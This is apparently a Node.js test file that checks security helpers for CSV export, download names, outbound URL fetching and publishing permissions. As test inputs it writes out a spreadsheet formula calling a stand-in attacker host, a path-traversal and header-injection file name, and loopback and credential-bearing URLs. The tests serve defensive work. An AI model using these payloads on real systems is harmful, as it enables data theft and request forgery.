import assert from "node:assert/strict";
import test from "node:test";
import { safeCsvCell, safeDownloadSlug } from "../lib/csv";
import { canSubmitReview } from "../lib/editor-auth";
import { assertPublicHttpsUrl } from "../lib/safe-source-probe";

test("neutralizes spreadsheet formulas and hostile download names",()=>{
  assert.equal(safeCsvCell("=WEBSERVICE(\"https://attacker.invalid\")"),'"\'=WEBSERVICE(""https://attacker.invalid"")"');
  assert.equal(safeDownloadSlug('../../bad\r\nX-Injected: yes','fallback'),'bad-x-injected-yes');
});

test("blocks private, local and credential-bearing source targets",async()=>{
  await assert.rejects(()=>assertPublicHttpsUrl("http://example.com"),/HTTPS/);
  await assert.rejects(()=>assertPublicHttpsUrl("https://127.0.0.1/internal"),/Private/);
  await assert.rejects(()=>assertPublicHttpsUrl("https://localhost/internal"),/Private/);
  await assert.rejects(()=>assertPublicHttpsUrl("https://user:password@example.com"),/credential-free/);
});

test("keeps publication permission server-role controlled",()=>{
  assert.equal(canSubmitReview(null,"source"),false);
  assert.equal(canSubmitReview("editor","publication"),false);
  assert.equal(canSubmitReview("reviewer","publication"),false);
  assert.equal(canSubmitReview("publisher","publication"),true);
});
